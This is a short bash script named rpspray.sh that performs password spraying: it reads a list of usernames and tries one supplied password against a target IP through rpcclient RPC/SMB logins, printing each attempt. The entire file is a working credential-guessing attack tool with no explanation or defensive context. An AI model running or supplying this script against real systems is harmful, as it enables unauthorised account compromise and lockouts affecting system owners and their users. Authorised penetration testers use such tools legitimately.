#!/bin/bash
userfiles=$1
password=$2
targetip=$3
if [ "$1" == "" ] || [ "$2" == "" ] || [ "$3" == "" ]
    then
    echo "Usage : ./rpspray.sh userlist passwordtospray targetip"
else
    for u in `cat $userfiles`; 
    do 
    echo -ne "[*] Trying user : $u \n" && 
    rpcclient -U "$u%$2" -c "getusername;quit" $3
    done
fi 
